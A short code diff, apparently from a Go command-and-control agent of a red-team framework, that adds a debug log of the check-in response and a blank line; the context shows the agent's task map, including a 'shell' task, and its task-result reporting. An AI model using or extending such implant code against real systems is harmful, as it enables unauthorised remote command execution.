@@ -92,7 +92,7 @@ func main() {
 	// fmt.Println(currentUser.Name)
 	resp := profile.CheckIn(currIP, currPid, currentUser.Username, hostname)
 	checkIn := resp.(structs.CheckInMessageResponse)
-
+	log.Printf("Checkin response: %+v\n", checkIn)
 	tasktypes := map[string]int{
 		"exit":            EXIT_CODE,
 		"shell":           1,
@@ -414,6 +414,7 @@ func main() {
 					resp.Completed = true
 					resp.TaskID = toApfell.TaskItem.TaskID
 					resp.UserOutput = string(toApfell.TaskResult)
+
 					encResp, err := json.Marshal(resp)
 					if err != nil {
 						log.Println("Error marshaling task response: ", err.Error())
